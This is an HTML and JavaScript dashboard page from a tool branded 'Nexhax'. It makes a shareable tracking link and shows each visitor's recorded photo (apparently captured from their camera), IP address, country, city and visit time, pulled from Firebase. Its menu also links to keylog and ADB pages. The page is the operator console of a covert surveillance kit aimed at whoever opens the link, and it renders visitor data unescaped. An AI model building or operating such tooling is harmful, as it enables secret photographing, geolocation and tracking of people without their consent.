<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="description" content="Rastreador de visitas - Nexhax">
    <meta name="theme-color" content="#000000">
    <title>Rastreador - Nexhax</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <header class="topbar">
        <div class="brand">Nexhax</div>
        <nav class="nav-links">
            <a href="home.html">Dashboard</a>
            <a href="rastreo.html" class="active">Rastreo</a>
            <a href="keylogs.html">Keylogs</a>
            <a href="perfil.html">Perfil</a>
            <a href="adb.html">ADB</a>
        </nav>
        <a href="home.html" class="btn-ghost btn-inline">Volver</a>
    </header>
    <div class="card">
        <h2>Rastreador de Visitas</h2>

        <div class="link-box">
            <p class="link-label">Tu Link de Rastreo</p>
            <code id="myLink">
                <span class="loading"></span> Generando...
            </code>
        </div>

        <button id="btn-copy">
            Copiar Link
        </button>
        <button class="btn-secondary" id="btn-del">
            Limpiar Todos los Datos
        </button>
        <button class="btn-secondary" id="btn-clean">
            Limpiar Fotos Expiradas
        </button>
    </div>

    <div class="card">
        <h3 style="margin-bottom:20px;">
            Historial de Visitas
            <span class="expires-badge">Las fotos expiran en 1 hora</span>
        </h3>
        <div class="table-wrap">
            <table>
                <thead>
                    <tr>
                        <th>Foto</th>
                        <th>IP / País</th>
                        <th>Ciudad</th>
                        <th>Fecha</th>
                    </tr>
                </thead>
                <tbody id="list">
                    <tr>
                        <td colspan="4" style="text-align:center;">
                            <span class="loading"></span> Cargando...
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>

    <div id="photoModal" class="modal">
        <span class="modal-close" onclick="closeModal()">&times;</span>
        <img id="modalImage" class="modal-content">
    </div>

    <script type="module">
        import { auth, db, ref, onValue, remove, update, set, onDisconnect, signOut } from './firebase-config.js';
        import { ensureSingleSession } from './session-guard.js';
        import { showToast } from './toast.js';

        const txtLink = document.getElementById('myLink');
        const tableList = document.getElementById('list');
        const btnCopy = document.getElementById('btn-copy');
        const btnDelete = document.getElementById('btn-del');
        const btnClean = document.getElementById('btn-clean');

        let currentUserId = null;

        auth.onAuthStateChanged(u => {
            if (!u) {
                location.href = 'index.html';
                return;
            }

            ensureSingleSession({ auth, db, ref, set, onValue, onDisconnect, signOut, user: u });

            currentUserId = u.uid;

            const link = `${window.location.origin}/view.html?id=${u.uid}`;
            txtLink.textContent = link;

            const visitasRef = ref(db, `visitas/${u.uid}`);
            onValue(visitasRef, async (snap) => {
                tableList.innerHTML = "";

                if (!snap.exists()) {
                    tableList.innerHTML = `
                        <tr>
                            <td colspan='4' style='text-align:center; padding:24px; color:#999;'>
                                No hay visitas registradas aún
                            </td>
                        </tr>
                    `;
                    return;
                }

                const visits = [];
                snap.forEach(child => {
                    visits.push({ key: child.key, ...child.val() });
                });

                visits.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

                const now = Date.now();

                for (const v of visits) {
                    let photoHTML = '<span class="no-photo">Sin foto</span>';
                    const isExpired = v.expiresAt && v.expiresAt < now;

                    if (v.foto && !isExpired) {
                        photoHTML = `<img src="${v.foto}" class="photo-thumb" onclick="showPhoto('${v.foto}')" alt="Foto">`;
                    } else if (isExpired && v.foto) {
                        photoHTML = '<span class="no-photo">Expirada</span>';
                    }

                    const rowClass = isExpired ? 'expired' : '';
                    const row = `
                        <tr class="${rowClass}">
                            <td>${photoHTML}</td>
                            <td><strong>${v.ip || 'N/A'}</strong><br><small style="color:#999;">${v.pais || ''}</small></td>
                            <td>${v.ciudad || 'Desconocida'}</td>
                            <td>${v.fecha || 'N/A'}</td>
                        </tr>
                    `;
                    tableList.innerHTML += row;
                }
            });

            btnCopy.onclick = async () => {
                try {
                    await navigator.clipboard.writeText(link);
                    btnCopy.textContent = '✓ Copiado';
                    setTimeout(() => {
                        btnCopy.textContent = 'Copiar Link';
                    }, 2000);
                } catch (err) {
                    showToast('Error al copiar. Link: ' + link, 'error');
                }
            };

            btnDelete.onclick = async () => {
                if (confirm("¿Estás seguro de eliminar TODAS las visitas registradas?")) {
                    btnDelete.disabled = true;
                    btnDelete.textContent = 'Eliminando...';

                    try {
                        await remove(visitasRef);
                        showToast('Datos eliminados correctamente', 'success');
                    } catch (err) {
                        showToast('Error al eliminar: ' + err.message, 'error');
                    } finally {
                        btnDelete.disabled = false;
                        btnDelete.textContent = 'Limpiar Todos los Datos';
                    }
                }
            };

            btnClean.onclick = async () => {
                if (confirm("¿Eliminar todas las fotos expiradas (más de 1 hora)?")) {
                    btnClean.disabled = true;
                    btnClean.textContent = 'Limpiando...';

                    try {
                        await cleanExpiredPhotos();
                        showToast('Fotos expiradas eliminadas', 'success');
                    } catch (err) {
                        showToast('Error: ' + err.message, 'error');
                    } finally {
                        btnClean.disabled = false;
                        btnClean.textContent = 'Limpiar Fotos Expiradas';
                    }
                }
            };
        });

        async function cleanExpiredPhotos() {
            const visitasRef = ref(db, `visitas/${currentUserId}`);
            const snap = await new Promise(resolve => {
                onValue(visitasRef, resolve, { onlyOnce: true });
            });

            if (!snap.exists()) return;

            const now = Date.now();
            const updates = {};

            snap.forEach(child => {
                const visit = child.val();
                if (visit.expiresAt && visit.expiresAt < now && visit.foto) {
                    updates[`visitas/${currentUserId}/${child.key}/foto`] = null;
                }
            });

            if (Object.keys(updates).length > 0) {
                await update(ref(db), updates);
            }
        }

        window.showPhoto = function (url) {
            document.getElementById('modalImage').src = url;
            document.getElementById('photoModal').classList.add('active');
        };

        window.closeModal = function () {
            document.getElementById('photoModal').classList.remove('active');
        };

        document.getElementById('photoModal').onclick = function (e) {
            if (e.target === this) {
                closeModal();
            }
        };
    </script>
</body>

</html>
